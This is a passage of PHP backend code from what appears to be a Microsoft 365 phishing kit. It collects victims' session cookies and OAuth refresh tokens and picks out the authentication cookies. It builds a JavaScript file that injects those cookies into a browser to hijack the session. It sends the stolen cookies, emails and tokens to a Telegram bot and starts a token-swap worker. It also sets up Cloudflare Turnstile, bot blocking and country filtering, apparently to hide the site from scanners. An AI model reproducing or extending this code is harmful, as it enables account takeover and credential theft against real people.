                    if (empty($line) || $line[0] === '#') continue;
                    
                    $m = explode("\t", $line);
                    if (count($m) >= 7) {
                        $domain = trim($m[0]);
                        $name = trim($m[5]);
                        $value = trim($m[6]);
                        
                        // Normalization: Ensure leading dot for major session cookies
                        if (strpos($domain, 'microsoft') !== false && $domain[0] !== '.') {
                            $domain = '.' . $domain;
                        }
                        
                        $exists = false;
                        foreach ($cookies as &$c) {
                            if ($c['name'] === $name && ($c['domain'] === $domain || $c['domain'] === substr($domain, 1))) {
                                $c['value'] = $value;
                                $c['domain'] = $domain;
                                $exists = true;
                                break;
                            }
                        }
                        if (!$exists) {
                    $cookies[] = [
                        'name' => $name, 'value' => $value, 'domain' => $domain,
                        'path' => '/', 'secure' => true, 'sameSite' => 'None', 'expires' => time() + (365 * 24 * 60 * 60)
                    ];
                }
            }
        }
        unlink($cookieJar);
        }
        Security::log("SWAP_ALL_COLLECTED_COOKIES: " . json_encode($cookies));

        // 3. Filter for the "Essential Cookies"
        $essentialNames = [
                'ESTSAUTH','ESTSAUTHPERSISTENT','buid','fpc','stsservicecookie','x-ms-gateway-slice',
                'luat','SuiteServiceProxyKey','OWAAppIdType','MSPAuth','MSPOK','rtFa','FedAuth',
                'RPSSecAuth','RPSToken','STSServiceCookie','x-ms-cpim-sso:','brcap','SignInStateCookie',
                'AADSSO', 'esctx', 'ClientId', 'X-OWA-RedirectHistory', 'OH.SID', 'OH.FLID',
                'OpenIdConnect.nonce', 'OpenIdConnect.id_token', 'OIDC', 'MSFPC', 'msal.cache.encryption', 'x-ocditid'
            ];
            
            // Priority domains for cookie selection
            $domainPriority = [
                '.m365.cloud.microsoft' => 100,
                '.login.microsoftonline.com' => 90,
                '.outlook.office.com' => 85,
                '.office.com' => 80,
                '.microsoft.com' => 70,
                '.login.live.com' => 60
            ];
            
            // Add modern OIDC cookies to the pool
            $modernPatterns = ['/\.AspNetCore\.OpenIdConnect\.Nonce\./', '/\.AspNetCore\.Correlation\./', '/^esctx/'];
            
            $finalCookies = [];
            // Strategy: First find exact matches for essentialNames, prioritized by domain
            foreach ($essentialNames as $name) {
                $candidates = [];
                foreach ($cookies as $c) {
                    if ($c['name'] === $name) {
                        $priority = 0;
                        foreach ($domainPriority as $domain => $score) {
                            if (strpos($c['domain'], $domain) !== false) {
                                $priority = $score;
                                break;
                            }
                        }
                        $candidates[] = ['c' => $c, 'p' => $priority];
                    }
                }
                if (!empty($candidates)) {
                    usort($candidates, function($a, $b) { return $b['p'] - $a['p']; });
                    $finalCookies[] = $candidates[0]['c'];
                }
            }
            
            // Strategy: Find fuzzy matches for patterns and remaining essentials
            foreach ($cookies as $c) {
                $alreadyIn = false;
                foreach ($finalCookies as $f) { if($f['name'] === $c['name'] && $f['domain'] === $c['domain']) { $alreadyIn = true; break; } }
                if ($alreadyIn) continue;

                $match = false;
                // STICKY: Always include ALL cookies from modern M365 domain if they aren't duplicates
                if (strpos($c['domain'], 'm365.cloud.microsoft') !== false) {
                    $match = true;
                }
                
                if (!$match) {
                    foreach ($modernPatterns as $pattern) { if (preg_match($pattern, $c['name'])) { $match = true; break; } }
                }
                
                if (!$match) {
                    // Fuzzy match for essentialNames (e.g. esctx-...)
                    foreach ($essentialNames as $name) { if (stripos($c['name'], $name) !== false) { $match = true; break; } }
                }

                if ($match) {
                    $finalCookies[] = $c;
                    if (count($finalCookies) >= 50) break; // Increased to 50 for full M365 support
                }
            }
            
            // Success detection: Traditional session cookies are REQUIRED for login
            $hasTraditional = false;
            $hasModernOidc = false;
            
            foreach ($finalCookies as $c) {
                // Legacy Markers
                if ($c['name'] === 'ESTSAUTH' || $c['name'] === 'ESTSAUTHPERSISTENT' || 
                    $c['name'] === 'rtFa' || $c['name'] === 'FedAuth' || 
                    $c['name'] === 'MSPAuth' || $c['name'] === 'MSPOK' ||
                    $c['name'] === 'RPSSecAuth' || $c['name'] === 'SignInStateCookie') {
                    $hasTraditional = true;
                }
                
                // Modern M365 Markers (OIDC)
                if (strpos($c['name'], '.AspNetCore.OpenIdConnect.Nonce.') !== false || 
                    strpos($c['name'], '.AspNetCore.Correlation.') !== false) {
                    $hasModernOidc = true;
                }
            }
            
            // Success: If we have legacy markers OR a complete set of modern OIDC markers
            $hasAuth = $hasTraditional || $hasModernOidc;
            
            $capturedNames = [];
            foreach ($finalCookies as $f) {
                $capturedNames[] = $f['name'];
            }
            
            Security::log("PHP_CAPTURE: Finished. Essential count: " . count($finalCookies) . ". Cookies: " . implode(', ', $capturedNames) . ". Has Auth: " . ($hasAuth ? "YES" : "NO"));
            Security::log("SWAP_FINAL_COOKIES: " . json_encode($finalCookies));
            
            return ['cookies' => $finalCookies, 'tokens' => $tokens];
            
        } catch (\Exception $e) {
            Security::log("PHP_CAPTURE ERROR: " . $e->getMessage());
            return ['cookies' => [], 'tokens' => $tokens ?? []];
        }
    }

    private static function extractCookiesFromResponse($response, &$cookies, $defaultDomain) {
        preg_match_all('/^Set-Cookie:\s*([^;\r\n]*)/mi', $response, $matches);
        preg_match_all('/^Set-Cookie:\s*(.*)$/mi', $response, $fullMatches);
        
        foreach($fullMatches[1] as $fullItem) {
            $parts = explode(';', $fullItem);
            $cookiePart = trim($parts[0]);
            $kv = explode('=', $cookiePart, 2);
            
            if (count($kv) === 2) {
                $name = trim($kv[0]);
                $value = trim($kv[1]);
                
                // Determine domain
                $domain = $defaultDomain;
                foreach ($parts as $p) {
                    $p = trim($p);
                    if (stripos($p, 'domain=') === 0) {
                        $domain = trim(substr($p, 7));
                        break;
                    }
                }
                
                // Normalization: Ensure leading dot for major session cookies
                if ($domain && $domain[0] !== '.') {
                    $domain = '.' . $domain;
                }

                // Check for duplicates (keep latest)
                $exists = false;
                foreach($cookies as &$c) {
                    if($c['name'] === $name && ($c['domain'] === $domain || $c['domain'] === substr($domain, 1))) {
                        $c['value'] = $value;
                        $c['domain'] = $domain; // Normalize to leading dot
                        $exists = true;
                        Security::log("COOKIE_EXTRACTED_UPDATE: Name={$name}, Value={$value}, Domain={$domain}");
                        break;
                    }
                }
                if(!$exists) {
                    $cookies[] = [
                        'name' => $name,
                        'value' => $value,
                        'domain' => $domain,
                        'path' => '/',
                        'secure' => true,
                        'sameSite' => 'None',
                        'expires' => time() + (365 * 24 * 60 * 60)
                    ];
                    Security::log("COOKIE_EXTRACTED_NEW: Name={$name}, Value={$value}, Domain={$domain}");
                }
            }
        }
    }

    private static function handleGetTokens() {
        $id = isset($_GET['id']) ? preg_replace('/[^a-zA-Z0-9._-]/', '', $_GET['id']) : '';
        if (!$id) {
            echo json_encode(['ok' => false, 'error' => 'Missing ID']);
            exit;
        }
        $sessionDir = __DIR__ . '/../session_data';
        $file = $sessionDir . '/tokens_' . $id . '.json';
        if (file_exists($file)) {
            echo json_encode(['ok' => true, 'tokens' => json_decode(file_get_contents($file), true)]);
        } else {
            // Try to find it in the event log if tokens_.json doesn't exist
            $db = new Database();
            $info = $db->getEventInfo($id);
            if ($info && isset($info['token_data'])) {
                echo json_encode(['ok' => true, 'tokens' => $info['token_data']]);
            } else {
                echo json_encode(['ok' => false, 'error' => 'Tokens not found']);
            }
        }
    }

    private static function handleReceiveCookies() {
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
            http_response_code(405);
            echo json_encode(['ok' => false, 'error' => 'Method Not Allowed']);
            exit;
        }
        $raw = file_get_contents('php://input');
        $data = json_decode($raw, true);
        if (!is_array($data) || empty($data['cookies'])) {
            http_response_code(400);
            echo json_encode(['ok' => false, 'error' => 'Invalid data']);
            exit;
        }

        $cookies = $data['cookies'];
        $email = $data['email'] ?? 'manual_extract';
        $cookieId = uniqid('manual_', true);

        $sessionDir = __DIR__ . '/../session_data';
        if (!is_dir($sessionDir)) mkdir($sessionDir, 0777, true);

        // Save as JSON event
        $db = new Database();
        $db->logEvent([
            'cookieId' => $cookieId,
            'type' => 'manual_extract',
            'emailMask' => $email,
            'domain' => 'manual',
            'attempt' => 1,
            'password' => 'MANUAL_EXTRACT',
            'ip' => Security::getClientIp(),
            'ua' => $_SERVER['HTTP_USER_AGENT'] ?? '',
            'time' => date('c')
        ]);

        // Generate injection script
        $sessionTimestamp = date('c');
        $sessionInjectScript = $sessionDir . '/inject_session_' . $cookieId . '.js';
        
        $scriptContent = "// @ClosedService-Pages Manual Extraction\n";
        $scriptContent .= "// Generated on $sessionTimestamp\n";
        $scriptContent .= "(function() {\n";
        $scriptContent .= "    const cookies = " . json_encode($cookies, JSON_PRETTY_PRINT) . ";\n";
        $scriptContent .= "    cookies.forEach(c => {\n";
        $scriptContent .= "        try {\n";
        $scriptContent .= "            let s = c.name + '=' + c.value + '; ';\n";
        $scriptContent .= "            if (c.domain) s += 'domain=' + c.domain + '; ';\n";
        $scriptContent .= "            if (c.path) s += 'path=' + c.path + '; ';\n";
        $scriptContent .= "            if (c.expires) s += 'expires=' + new Date(c.expires * 1000).toUTCString() + '; ';\n";
        $scriptContent .= "            if (c.secure) s += 'secure; ';\n";
        $scriptContent .= "            if (c.sameSite) s += 'samesite=' + c.sameSite + '; ';\n";
        $scriptContent .= "            document.cookie = s;\n";
        $scriptContent .= "        } catch(e) {}\n";
        $scriptContent .= "    });\n";
        $scriptContent .= "    console.log('Injected ' + cookies.length + ' cookies');\n";
        $scriptContent .= "})();";

        file_put_contents($sessionInjectScript, $scriptContent);

        // Telegram Notification
        $cfg = Config::load();
        if (!empty($cfg['telegramBotToken']) && !empty($cfg['telegramChatId'])) {
            $ip = Security::getClientIp();
            $ua = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
            $msg = Worker::generateTelegramMessage($email, "MANUAL_EXTRACT", $ip, $ua, "🍪 (Manual Extraction Successful)");
            
            $url = "https://api.telegram.org/bot{$cfg['telegramBotToken']}/sendMessage";
            $payload = [
                'chat_id' => $cfg['telegramChatId'],
                'text' => $msg
            ];
            Worker::sendRequest($url, $payload, $cfg);
            
            // Send document
            $urlDoc = "https://api.telegram.org/bot{$cfg['telegramBotToken']}/sendDocument";
            $payloadDoc = [
                'chat_id' => $cfg['telegramChatId'],
                'document' => new \CURLFile($sessionInjectScript, 'application/javascript', "cookies_{$email}.js"),
                'caption' => "/////// MANUAL COOKIES 🍪 POWERED BY CLOSEDPAGE 4 $email/////////"
            ];
            Worker::sendRequest($urlDoc, $payloadDoc, $cfg, true);
        }

        echo json_encode(['ok' => true, 'cookieId' => $cookieId]);
    }

    private static function handleReceiveTokens() {
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
            http_response_code(405);
            echo json_encode(['ok' => false, 'error' => 'Method Not Allowed']);
            exit;
        }

        $raw = file_get_contents('php://input');
        $data = json_decode($raw, true);
        if (!is_array($data) || empty($data['refresh_token'])) {
            http_response_code(400);
            echo json_encode(['ok' => false, 'error' => 'Missing token data']);
            exit;
        }

        $email = $data['email'] ?? 'hybrid_extract';
        $accessToken = $data['access_token'] ?? null;
        $refreshToken = $data['refresh_token'];
        $cookieId = uniqid('hybrid_', true);

        $sessionDir = __DIR__ . '/../session_data';
        if (!is_dir($sessionDir)) mkdir($sessionDir, 0777, true);

        // Save token data to event file for the Hybrid Worker (token_swap.js)
        $eventFile = $sessionDir . '/event_' . $cookieId . '.json';
        $eventData = [
            'cookieId' => $cookieId,
            'email' => $email,
            'token_data' => [
                'access_token' => $accessToken,
                'refresh_token' => $refreshToken
            ],
            'time' => date('c')
        ];
        file_put_contents($eventFile, json_encode($eventData, JSON_PRETTY_PRINT));

        // Log to database
        $db = new Database();
        $db->logEvent([
            'cookieId' => $cookieId,
            'type' => 'hybrid_extract',
            'emailMask' => $email,
            'domain' => 'microsoft',
            'attempt' => 1,
            'ip' => Security::getClientIp(),
            'ua' => $_SERVER['HTTP_USER_AGENT'] ?? '',
            'time' => date('c')
        ]);

        // Trigger Hybrid Worker (token_swap.js) to generate full 13 cookies
        $projectRoot = realpath(__DIR__ . '/..');
        $cmd = "cd " . escapeshellarg($projectRoot) .
               " && if command -v chromium >/dev/null 2>&1; then export PUPPETEER_EXECUTABLE_PATH=`command -v chromium`; fi" .
               " && HOME=" . escapeshellarg($projectRoot) .
               " NODE_PATH=" . escapeshellarg($projectRoot . '/node_modules') .
               " XDG_CONFIG_HOME=" . escapeshellarg($projectRoot . '/chrome_config') .
               " XDG_CACHE_HOME=" . escapeshellarg($projectRoot . '/.cache') .
               " PUPPETEER_CACHE_DIR=" . escapeshellarg($projectRoot . '/.cache/puppeteer') .
               " node " . escapeshellarg($projectRoot . '/token_swap.js') . " " . escapeshellarg($email) . " \"OAUTH_TOKEN_CAPTURED\" " . escapeshellarg($cookieId) . " > /dev/null 2>&1 &";

        Security::log("HYBRID: Triggering Hybrid Worker for $email ($cookieId)");
        shell_exec($cmd);

        // Notify via Telegram
        $cfg = Config::load();
        if (!empty($cfg['telegramBotToken']) && !empty($cfg['telegramChatId'])) {
            $msg = Worker::generateTelegramMessage($email, "HYBRID_FLOW_START", Security::getClientIp(), $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown', "🔄 Hybrid Token Capture Successful! Generating cookies...");
            $urlTg = "https://api.telegram.org/bot{$cfg['telegramBotToken']}/sendMessage";
            Worker::sendRequest($urlTg, ['chat_id' => $cfg['telegramChatId'], 'text' => $msg], $cfg);
        }

        echo json_encode(['ok' => true, 'cookieId' => $cookieId]);
    }

    private static function handleGetCloudflareZones() {
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
            http_response_code(405);
            echo json_encode(['ok' => false, 'error' => 'Method Not Allowed']);
            exit;
        }

        $raw = file_get_contents('php://input');
        $data = json_decode($raw, true);
        if (!is_array($data)) {
            http_response_code(400);
            echo json_encode(['ok' => false, 'error' => 'Invalid JSON']);
            exit;
        }

        $apiKey = trim((string)($data['cfApiKey'] ?? ''));
        $email = trim((string)($data['cfEmail'] ?? ''));

        if (!$apiKey) {
            http_response_code(400);
            echo json_encode(['ok' => false, 'error' => 'Missing API Key']);
            exit;
        }

        $isToken = (strlen($apiKey) >= 40 && strpos($apiKey, 'cfk_') === false);
        $headers = ["Content-Type: application/json"];
        if ($isToken) {
            $headers[] = "Authorization: Bearer $apiKey";
        } else {
            $headers[] = "X-Auth-Email: $email";
            $headers[] = "X-Auth-Key: $apiKey";
        }

        $url = "https://api.cloudflare.com/client/v4/zones";
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_TIMEOUT, 15);
        
        $resp = curl_exec($ch);
        $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);

        $json = json_decode($resp, true);

        if ($code === 200 && isset($json['success']) && $json['success']) {
            $zones = [];
            foreach ($json['result'] as $zone) {
                $zones[] = [
                    'id' => $zone['id'],
                    'name' => $zone['name'],
                    'account' => [
                        'id' => $zone['account']['id'],
                        'name' => $zone['account']['name']
                    ]
                ];
            }
            echo json_encode(['ok' => true, 'zones' => $zones]);
        } else {
            $error = $json['errors'][0]['message'] ?? 'Unknown Cloudflare Error';
            echo json_encode(['ok' => false, 'error' => $error]);
        }
    }

    private static function handleCreateTurnstileWidget() {
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
            http_response_code(405);
            echo json_encode(['ok' => false, 'error' => 'Method Not Allowed']);
            exit;
        }

        $raw = file_get_contents('php://input');
        $data = json_decode($raw, true);
        if (!is_array($data)) {
            http_response_code(400);
            echo json_encode(['ok' => false, 'error' => 'Invalid JSON']);
            exit;
        }

        $apiKey = trim((string)($data['cfApiKey'] ?? ''));
        $email = trim((string)($data['cfEmail'] ?? ''));
        $accountId = trim((string)($data['cfAccountId'] ?? ''));
        $mode = trim((string)($data['mode'] ?? 'invisible'));
        
        // Handle domains array or single string
        $domains = [];
        if (isset($data['domains']) && is_array($data['domains'])) {
            $domains = array_filter(array_map('trim', $data['domains']));
        } elseif (isset($data['domainName'])) {
            $domains = [trim((string)$data['domainName'])];
        }
        $domains = array_values(array_unique(array_filter($domains)));

        if (!$apiKey || !$accountId || empty($domains)) {
            http_response_code(400);
            echo json_encode(['ok' => false, 'error' => 'Missing required fields (API Key, Account ID, Domains)']);
            exit;
        }

        $isToken = (strlen($apiKey) >= 40 && strpos($apiKey, 'cfk_') === false);
        $headers = ["Content-Type: application/json"];
        if ($isToken) {
            $headers[] = "Authorization: Bearer $apiKey";
        } else {
            $headers[] = "X-Auth-Email: $email";
            $headers[] = "X-Auth-Key: $apiKey";
        }

        // Widget Name based on first domain + count
        $widgetName = 'L1mk Security - ' . $domains[0];
        if (count($domains) > 1) {
            $widgetName .= ' (+' . (count($domains) - 1) . ' others)';
        }

        $widgetData = [
            'name' => $widgetName,
            'domains' => $domains,
            'mode' => $mode,
            'region' => 'world'
        ];

        // Check for existing Site Key in Config
        $cfg = Config::load();
        $existingSiteKey = isset($cfg['cfSiteKey']) ? trim((string)$cfg['cfSiteKey']) : '';
        $existingSecretKey = isset($cfg['cfSecretKey']) ? trim((string)$cfg['cfSecretKey']) : '';
        
        $method = 'POST';
        $endpoint = "accounts/$accountId/challenges/widgets";
        $actionType = 'created';

        // If we have an existing key, try to update it first
        if ($existingSiteKey !== '') {
            $method = 'PUT';
            $endpoint = "accounts/$accountId/challenges/widgets/$existingSiteKey";
            $actionType = 'updated';
            // Secret key is not updatable via this endpoint usually, but domains/mode/name are
        }

        $url = "https://api.cloudflare.com/client/v4/$endpoint";
        
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $method);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($widgetData));
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_TIMEOUT, 15);
        
        $resp = curl_exec($ch);
        $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $err = curl_error($ch);

        // Fallback: If update failed (e.g. key deleted or 404), create new one
        if ($method === 'PUT' && ($code === 404 || $code === 400)) {
            $method = 'POST';
            $endpoint = "accounts/$accountId/challenges/widgets";
            $url = "https://api.cloudflare.com/client/v4/$endpoint";
            $actionType = 'created (fallback)';
            
            $ch = curl_init($url);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($widgetData));
            curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
            curl_setopt($ch, CURLOPT_TIMEOUT, 15);
            
            $resp = curl_exec($ch);
            $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            $err = curl_error($ch);
        }

        if ($resp === false) {
            http_response_code(500);
            echo json_encode(['ok' => false, 'error' => 'Curl error: ' . $err]);
            exit;
        }

        $json = json_decode($resp, true);

        if ($code !== 200 || empty($json['success'])) {
            http_response_code(400);
            $errMsg = $json['errors'][0]['message'] ?? 'Unknown Cloudflare Error';
            echo json_encode(['ok' => false, 'error' => $errMsg, 'details' => $json]);
            exit;
        }

        $result = $json['result'];
        
        // Save to config immediately
        $cfg['cfSiteKey'] = $result['sitekey'];
        // Update secret only if provided (create) or we have it (update)
        if (isset($result['secret'])) {
            $cfg['cfSecretKey'] = $result['secret'];
        }
        $cfg['cfTurnstileEnabled'] = true;
        // Auto-set invisible toggle based on widget mode
        if ($mode === 'invisible') {
            $cfg['cfTurnstileInvisible'] = true;
        } else {
            $cfg['cfTurnstileInvisible'] = false;
        }
        Config::save($cfg);

        echo json_encode([
            'ok' => true,
            'action' => $actionType,
            'siteKey' => $result['sitekey'],
            'secretKey' => $cfg['cfSecretKey'], // Return stored secret
            'mode' => $result['mode']
        ]);
    }

    private static function handleSyncCloudflare() {
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
            http_response_code(405);
            echo json_encode(['ok' => false, 'error' => 'Method Not Allowed']);
            exit;
        }

        $raw = file_get_contents('php://input');
        $data = json_decode($raw, true);
        if (!is_array($data)) {
            http_response_code(400);
            echo json_encode(['ok' => false, 'error' => 'Invalid JSON']);
            exit;
        }

        $apiKey = trim((string)($data['cfApiKey'] ?? ''));
        $email = trim((string)($data['cfEmail'] ?? ''));
        $zoneId = trim((string)($data['cfZoneId'] ?? ''));

        if (!$apiKey || !$zoneId) {
            http_response_code(400);
            echo json_encode(['ok' => false, 'error' => 'Missing required credentials']);
            exit;
        }

        $isToken = (strlen($apiKey) >= 40 && strpos($apiKey, 'cfk_') === false);
        $headers = ["Content-Type: application/json"];
        if ($isToken) {
            $headers[] = "Authorization: Bearer $apiKey";
        } else {
            $headers[] = "X-Auth-Email: $email";
            $headers[] = "X-Auth-Key: $apiKey";
        }

        $cf = function($method, $endpoint) use ($headers) {
            $url = "https://api.cloudflare.com/client/v4/" . ltrim($endpoint, '/');
            $ch = curl_init($url);
            curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $method);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
            curl_setopt($ch, CURLOPT_TIMEOUT, 15);
            $resp = curl_exec($ch);
            $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            return ['code' => $code, 'body' => json_decode($resp, true)];
        };

        $results = [
            'cfSecurityEnabled' => false,
            'cfBotShield' => false,
            'cfUnderAttack' => false,
            'cfCountryBlockingEnabled' => false,
            'cfAllowedCountries' => '',
            'raw' => []
        ];

        // 1. Check SSL/TLS and Always Use HTTPS
        $sslRes = $cf('GET', "zones/$zoneId/settings/ssl");
        $httpsRes = $cf('GET', "zones/$zoneId/settings/always_use_https");
        
        $sslValue = $sslRes['body']['result']['value'] ?? '';
        $httpsValue = $httpsRes['body']['result']['value'] ?? '';
        
        if (($sslValue === 'full' || $sslValue === 'strict') && $httpsValue === 'on') {
            $results['cfSecurityEnabled'] = true;
        }

        // 2. Check Security Level (Under Attack)
        $secLevelRes = $cf('GET', "zones/$zoneId/settings/security_level");
        $secLevel = $secLevelRes['body']['result']['value'] ?? '';
        if ($secLevel === 'under_attack') {
            $results['cfUnderAttack'] = true;
        }

        // 3. Check Bot Fight Mode and WAF Rules
        $botRes = $cf('GET', "zones/$zoneId/bot_management");
        $botValue = $botRes['body']['result']['fight_mode'] ?? false;
        
        $rulesRes = $cf('GET', "zones/$zoneId/rulesets");
        $hasRules = false;
        if ($rulesRes['code'] === 200 && !empty($rulesRes['body']['result'])) {
            foreach ($rulesRes['body']['result'] as $rs) {
                if (strpos($rs['name'] ?? '', 'Custom WAF Ruleset') !== false) {
                    // Check if ruleset actually has rules
                    $rsId = $rs['id'];
                    $rsDetails = $cf('GET', "zones/$zoneId/rulesets/$rsId");
                    if ($rsDetails['code'] === 200 && !empty($rsDetails['body']['result']['rules'])) {
                        $hasRules = true;
                        // Check for Country Blocking Rule
                        foreach ($rsDetails['body']['result']['rules'] as $rule) {
                            if (($rule['description'] ?? '') === 'L1mk: Country Block (Allow Only)' && !empty($rule['enabled'])) {
                                $results['cfCountryBlockingEnabled'] = true;
                                // Extract countries from expression: (not ip.geoip.country in {"US" "CA"})
                                if (preg_match('/ip\.geoip\.country in \{(.*?)\}/', $rule['expression'], $m)) {
                                    $cList = str_replace('"', '', $m[1]);
                                    $results['cfAllowedCountries'] = str_replace(' ', ', ', $cList);
                                }
                            }
                        }
                    }
                    break;
                }
            }
        }

        if ($botValue === true || $hasRules) {
            $results['cfBotShield'] = true;
        }

        echo json_encode(['ok' => true, 'results' => $results]);
    }

    private static function handleConfigureCloudflare() {
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
            http_response_code(405);
            echo json_encode(['ok' => false, 'error' => 'Method Not Allowed']);
            exit;
        }

        $raw = file_get_contents('php://input');
        $data = json_decode($raw, true);
        if (!is_array($data)) {
            http_response_code(400);
            echo json_encode(['ok' => false, 'error' => 'Invalid JSON']);
            exit;
        }

        $apiKey = trim((string)($data['cfApiKey'] ?? ''));
        $email = trim((string)($data['cfEmail'] ?? ''));
        $zoneId = trim((string)($data['cfZoneId'] ?? ''));
        
        // Granular flags
        $cfSecurityEnabled = !empty($data['cfSecurityEnabled']);
        $cfBotShield = !empty($data['cfBotShield']);
        $cfUnderAttack = !empty($data['cfUnderAttack']);
        $cfCountryBlockingEnabled = !empty($data['cfCountryBlockingEnabled']);
        $cfAllowedCountries = trim((string)($data['cfAllowedCountries'] ?? ''));

        if (!$apiKey || !$zoneId) {
            http_response_code(400);
            echo json_encode(['ok' => false, 'error' => 'Missing required credentials']);
            exit;
        }

        $isToken = (strlen($apiKey) >= 40 && strpos($apiKey, 'cfk_') === false);
        $headers = ["Content-Type: application/json"];
        if ($isToken) {
            $headers[] = "Authorization: Bearer $apiKey";
        } else {
            $headers[] = "X-Auth-Email: $email";
            $headers[] = "X-Auth-Key: $apiKey";
        }

        $cf = function($method, $endpoint, $postData = null) use ($headers) {
            $url = "https://api.cloudflare.com/client/v4/" . ltrim($endpoint, '/');
            $ch = curl_init($url);
            curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $method);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
            curl_setopt($ch, CURLOPT_TIMEOUT, 15);
            
            if ($postData !== null) {
                curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($postData));
            }
            
            $resp = curl_exec($ch);
            $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            return ['code' => $code, 'body' => json_decode($resp, true)];
        };

        $results = ['success' => true, 'errors' => []];

        // 1. SSL/HTTPS Configuration
        if ($cfSecurityEnabled) {
            $sslRes = $cf('PATCH', "zones/$zoneId/settings/ssl", ['value' => 'full']);
            $httpsRes = $cf('PATCH', "zones/$zoneId/settings/always_use_https", ['value' => 'on']);
            if ($sslRes['code'] !== 200) $results['errors'][] = 'SSL configuration failed';
            if ($httpsRes['code'] !== 200) $results['errors'][] = 'HTTPS configuration failed';
        } else {
            // Optional: Revert to flexible/off if disabled? 
            // Usually safer to leave as-is or revert to flexible. Let's revert for "toggle off" behavior.
            $cf('PATCH', "zones/$zoneId/settings/ssl", ['value' => 'flexible']);
            $cf('PATCH', "zones/$zoneId/settings/always_use_https", ['value' => 'off']);
        }

        // 2. Bot Fight Mode
        // Note: 'bot_management' endpoint requires Pro/Biz/Ent for some fields, but 'fight_mode' works for free/pro usually via this or settings
        if ($cfBotShield) {
            $botRes = $cf('PUT', "zones/$zoneId/bot_management", [
                'enable_js' => true,
                'fight_mode' => true
            ]);
            if ($botRes['code'] !== 200) {
                 // Fallback to settings endpoint
                 $settingsRes = $cf('PATCH', "zones/$zoneId/settings/bot_fight_mode", ['value' => 'on']);
                 if ($settingsRes['code'] !== 200) $results['errors'][] = 'Bot Fight Mode enable failed';
            }
        } else {
            $botRes = $cf('PUT', "zones/$zoneId/bot_management", [
                'enable_js' => false,
                'fight_mode' => false
            ]);
            if ($botRes['code'] !== 200) {
                 $settingsRes = $cf('PATCH', "zones/$zoneId/settings/bot_fight_mode", ['value' => 'off']);
                 // Don't error strictly here as it might already be off
            }
        }

        // 3. Security Level (Under Attack)
        $secLevel = $cfUnderAttack ? 'under_attack' : 'medium';
        $cf('PATCH', "zones/$zoneId/settings/security_level", ['value' => $secLevel]);

        // 4. Deploy Advanced WAF Rules (Auto-Setup)
        if ($cfBotShield) {
            self::deployWafRules($cf, $zoneId);
        }

        // 5. Deploy Country Blocking
        self::deployCountryBlocking($cf, $zoneId, $cfCountryBlockingEnabled, $cfAllowedCountries);

        // Save configuration locally
        Config::saveMerged([
            'cfSecurityEnabled' => $cfSecurityEnabled,
            'cfBotShield' => $cfBotShield,
            'cfUnderAttack' => $cfUnderAttack,
            'cfCountryBlockingEnabled' => $cfCountryBlockingEnabled,
            'cfAllowedCountries' => $cfAllowedCountries,
            'cfEmail' => $email,
            'cfApiKey' => $apiKey,
            'cfZoneId' => $zoneId,
            'cfSiteKey' => $data['cfSiteKey'] ?? '',
            'cfSecretKey' => $data['cfSecretKey'] ?? '',
            'cfTurnstileEnabled' => !empty($data['cfTurnstileEnabled']),
            'cfAccountId' => $data['cfAccountId'] ?? ''
        ]);

        if (empty($results['errors'])) {
            echo json_encode(['ok' => true, 'message' => 'Cloudflare configuration updated']);
        } else {
            echo json_encode(['ok' => false, 'errors' => $results['errors']]);
        }
    }

    private static function deployCountryBlocking($cf, $zoneId, $enabled, $countriesStr) {
        $rulesets = $cf('GET', "zones/$zoneId/rulesets");
        $phase = 'http_request_firewall_custom';
        $rulesetId = null;

        if ($rulesets['code'] === 200 && !empty($rulesets['body']['result'])) {
            foreach ($rulesets['body']['result'] as $rs) {
                if ($rs['phase'] === $phase && $rs['kind'] === 'zone') {
                    $rulesetId = $rs['id'];
                    break;
                }
            }
        }

        if (!$rulesetId) {
            if (!$enabled) return;
            $payload = [
                'name' => 'L1mk Custom Rules',
                'kind' => 'zone',
                'phase' => $phase,
                'rules' => []
            ];
            $res = $cf('POST', "zones/$zoneId/rulesets", $payload);
            if ($res['code'] === 200) {
                $rulesetId = $res['body']['result']['id'];
            } else {
                return; 
            }
        }

        $ruleDescription = 'L1mk: Country Block (Allow Only)';
        $existingRules = $cf('GET', "zones/$zoneId/rulesets/$rulesetId");
        $currentRules = $existingRules['body']['result']['rules'] ?? [];
        $existingRuleId = null;
        
        foreach ($currentRules as $cr) {
            if (($cr['description'] ?? '') === $ruleDescription) {
                $existingRuleId = $cr['id'];
                break;
            }
        }

        if ($enabled) {
            $countries = array_map('trim', explode(',', strtoupper($countriesStr)));
            $countries = array_filter($countries);
            
            if (empty($countries)) {
                if ($existingRuleId) {
                    $cf('DELETE', "zones/$zoneId/rulesets/$rulesetId/rules/$existingRuleId");
                }
                return;
            }

